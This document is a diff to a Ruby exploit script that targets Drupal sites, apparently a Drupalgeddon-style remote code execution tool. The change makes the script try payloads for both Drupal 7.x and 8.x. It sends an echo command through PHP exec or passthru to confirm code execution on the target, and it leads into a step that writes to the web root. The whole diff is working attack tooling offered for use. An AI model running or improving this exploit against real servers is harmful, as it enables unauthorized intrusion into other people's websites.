@@ -48,7 +48,7 @@ end
 def gen_evil_url(evil)
   # PHP function to use (don't forget about disabled functions...)
   phpmethod = $drupalversion.start_with?('8')? "exec" : "passthru"
-  puts "[*] PHP cmd: #{phpmethod}"
+  # puts "[*] PHP cmd: #{phpmethod}"
   puts "[*] Payload: #{evil}"
 
   ## Check the version to match the payload
@@ -99,6 +99,7 @@ end
 # Read in values
 $target = ARGV[0]
 $drupalversion = if ARGV[1] then ARGV[1] else nil end
+$drupalversions = []
 
 # Check input for protocol
 if not $target.start_with?('http')
@@ -183,10 +184,11 @@ end
 if $drupalversion
   status = $drupalversion.end_with?('x')? "?" : "!"
   puts "[+] Drupal#{status}: #{$drupalversion}"
+  $drupalversions = [$drupalversion]
 else
   puts "[!] Didn't detect Drupal version"
-  puts "[!] Forcing Drupal v8.x attack"
-  $drupalversion = "8.x"
+  puts "[!] Trying Drupal v7.x and v8.x"
+  $drupalversions = ["7.x","8.x"]
 end
 puts "-"*80
 
@@ -199,19 +201,29 @@ puts "-"*80
 random = (0...8).map { (65 + rand(26)).chr }.join
 
 # Make a request, testing code execution
-url, payload = gen_evil_url("echo #{random}")
-response = http_post(url, payload)
-if response.code == "200" and not response.body.empty?
-  #result = JSON.pretty_generate(JSON[response.body])
-  result = $drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
-  puts "[+] Result : #{result}"
+$drupalversions.each do|version|
+  puts "[+] Attacking version #{version}"
+  $drupalversion = version
+  url, payload = gen_evil_url("echo #{random}")
+  response = http_post(url, payload)
+  if response.code == "200" and not response.body.empty?
+    #result = JSON.pretty_generate(JSON[response.body])
+    result = $drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+    # puts "[+] Result : #{result}"
 
-  puts response.body.match(/#{random}/)? "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!" : "[+] Target might to be exploitable?"
-else
-  puts "[!] Target is NOT exploitable ~ HTTP Response: #{response.code}"
-  exit
+    if response.body.match(/#{random}/)
+      puts "[+] Result : #{result}"
+      puts "[+] Target seems to be exploitable (Code execution)!"
+      exit
+    else
+      puts "[+] Target might to be exploitable?"
+    end
+
+  else
+    puts "[!] Target is NOT exploitable ~ HTTP Response: #{response.code}"
+  end
+  puts "-"*80
 end
-puts "-"*80
 
 
 # Make a request, try and write to web root
